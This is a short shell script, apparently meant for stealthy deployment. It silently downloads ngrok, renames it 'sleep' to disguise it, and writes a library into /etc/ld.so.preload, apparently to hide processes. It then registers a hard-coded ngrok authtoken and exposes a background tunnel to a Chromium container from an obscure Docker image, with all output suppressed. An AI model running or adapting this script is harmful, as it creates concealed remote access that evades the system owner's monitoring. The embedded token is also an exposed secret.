wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz > /dev/null 2>&1
tar -xvzf ngrok-v3-stable-linux-amd64.tgz > /dev/null 2>&1
mv ngrok sleep
chmod +x sleep
chmod +x sleep.so
chmod +x ld.so.preload
sudo mv sleep.so /usr/local/lib/sleep.so
sudo mv ld.so.preload /etc/ld.so.preload
./sleep authtoken 2Qyuo1u3hVJfyJ1hNbla2KvKZkS_6We9aFPeTqXZMhmH5WSvm > /dev/null 2>&1
./sleep http 33440 >/dev/null 2>&1 >/dev/null &
#npm install -g localtunnel && lt --port 33440 > alamatsoket &
docker run -d --name=chromium1 -p 33440:7799 fookam/5953:6618 > /dev/null 2>&1
#sleep 30
